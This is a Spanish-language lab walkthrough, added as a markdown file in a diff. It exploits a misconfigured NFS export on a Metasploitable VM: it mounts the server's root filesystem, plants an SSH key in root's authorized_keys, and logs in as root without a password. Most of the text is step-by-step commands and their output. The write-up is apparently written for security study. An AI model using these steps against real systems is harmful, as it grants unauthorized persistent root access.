@@ -1,0 +1,184 @@
+### 🧩 Servicio: NFS (Network File System) – Puerto 2049.
+
+# 🎯 1. Objetivo de la explotación.
+
+El objetivo es aprovechar una configuración insegura del servicio NSF que permite:
+
+- Enumerar los directorios exportados por el servidor.
+- Montarlos remotamente desde Kali Linux.
+- Acceder a información sensible o incluso obtener acceso a shell persistente en la máquina víctima, especialmente si podemos:
+  - Encontrar una home de un usuario exportada.
+  - Escribir dentro de ella (como meter una clave SSH).
+  - Usar esto para entrar como ese usuario y, potencialmente, escalar privilegios.
+
+# 🪪 2. ¿Qué es NFS?.
+
+NFS permite que un sistema remoto "comparta carpetas" que pueden mostrarse en otras máquinas como si fueran locales.
+
+En entornos mal configurados, esto puede permitir que cualquier cliente se conecte y acceda a esas carpetas. A veces, incluso con permisos de escritura.
+
+# 🛠 3. Pasos para explotación de NFS.
+
+## 🔎 Paso 1: Escaneo con Nmap.
+
+```bash
+sudo nmap -sV -p 2049 192.168.56.102
+```
+
+Para identificar el servicio y la versión.
+
+## 🔎 Paso 2: Enumeramos recursos compartidos.
+
+Usamos showmount para listar los directorios que la máquina exporta:
+
+```bash
+showmount -e 192.168.56.102
+```
+
+Nos muestra:
+
+┌──(javier㉿kali)-[~]
+└─$ showmount -e 192.168.56.102         
+Export list for 192.168.56.102:
+/ *
+
+Lo que nos indica que es extremadamente vulnerable y peligroso ya que:
+
+- / → El servidor está exportando la raíz del sistema de archivos. Esto es extremadamente inseguro.
+- * → Cualquier cliente (cualquier IP) puede montar ese recurso. No hay restricciones.
+
+⚠️ Esto significa que puedes montar el sistema de archivos completo del servidor en tu máquina Kali, sin autenticación ni restricciones. Es como tener acceso directo al disco duro del servidor.
+
+## 📂 Paso 3: Crear un directorio local para montar.
+
+Creamos un punto de montaje en nuestra máquina Kali:
+
+```bash
+mkdir /tmp/nfs
+```
+
+## 🔗 Paso 4: Montar el recurso remoto en nuestra Kali:
+
+Usamos el comando mount para montar /.
+
+```bash
+sudo mount -t nfs 192.168.56.102:/ /tmp/nfs
+```
+
+Después de montarlo, podrás acceder a los archivos como si estuvieran en tu máquina:
+
+```bash
+ls -la /tmp/nfs
+```
+## 🔓 Paso 5: Generamos clave SSH:
+
+```bash
+ssh-keygen -f /tmp/key_nfs_root -N ''
+```
+
+Esto creará:
+
+- /tmp/key_nfs_root(clave privada).
+- /tmp/key_nfs_root.pub(clave pública).
+
+## 📂 Paso 6: Entramos en la raíz montada.
+
+```bash
+cd /tmp/nfs
+```
+
+Confirmamos que podemos acceder a /root.
+
+```bash
+ls -la root
+```
+
+Si vemos archivos como .bashrc, .profile...¡estamos dentro!
+
+## 🧱 Paso 7: Creamos .ssh/ y authorized_keys
+
+Dentro de /tmp/nfs/root:
+
+```bash
+mkdir .ssh  # si no existe
+chmod 700 .ssh
+cat /tmp/key_nfs_root.pub > .ssh/authorized_keys
+chmod 600 .ssh/authorized_keys
+```
+
+Ahora el sistema remoto acepta tu clave para root.
+
+## 🚪 Paso 8: Conectarnos por SSH como root.
+
+```bash
+ssh -i /tmp/key_nfs_root root@192.168.56.102
+```
+Si nos sale una advertencia de huella digital, aceptamos con yes.
+
+⚠️ Problema: No podemos conectarnos con la clave ed25519.
+
+Al intentar conectarte usando la clave generada anteriormente (/tmp/key_nfs_root), el sistema responde con:
+
+```bash
+Unable to negotiate with 192.168.56.102 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
+```
+
+🔍 Causa
+
+El servidor SSH en la máquina víctima solo acepta algoritmos de claves antiguos (ssh-rsa, ssh-dss). Nuestra clave es del tipo moderno ed25519, que no es compatible.
+
+🔄 Solución: Crear una clave SSH RSA (legacy compatible).
+
+Creamos una nueva clave compatible:
+
+```bash
+ssh-keygen -t rsa -b 2048 -f /tmp/key_rsa_compat -N ''
+```
+
+Esto genera:
+
+- Clave privada: /tmp/key_rsa_compat
+- Clave pública: /tmp/key_rsa_compat.pub
+
+## 🔁 Paso 9: Sustituimos la clave en el archivo authorized_keys.
+
+Copiamos la nueva clave pública al archivo authorized_keys del usuario root en el sistema montado por NFS:
+
+```bash
+cat /tmp/key_rsa_compat.pub > /tmp/nfs/root/.ssh/authorized_keys
+chmod 700 /tmp/nfs/root/.ssh
+chmod 600 /tmp/nfs/root/.ssh/authorized_keys
+```
+
+## 🔐 Paso 10: Conexión SSH usando la nueva clave.
+
+Ya con la clave RSA insertada, nos conectamos:
+
+```bash
+ssh -i /tmp/key_rsa_compat \
+    -oHostKeyAlgorithms=+ssh-rsa \
+    -oPubkeyAcceptedKeyTypes=+ssh-rsa \
+    root@192.168.56.102
+```
+
+✅ Resultado final:
+
+¡Acceso root sin necesidad de conocer la contraseña!
+
+```bash
+Last login: Thu Aug  7 09:52:59 2025 from :0.0
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+...
+root@metasploitable:~#
+```
+
+🧠 Conclusiones:
+
+- NFS mal configurado puede ser devastador: exportar / sin restricciones y sin root_squash es equivalente a regalar el sistema.
+- Gracias al montaje remoto, pudimos escribir en el .ssh de root.
+- La conexión por SSH requería clave tipo RSA debido a la antigüedad del servidor (y configuraciones inseguras).
+- El resultado fue un acceso persistente como root remoto sin necesidad de ninguna contraseña.
+
+
+
+
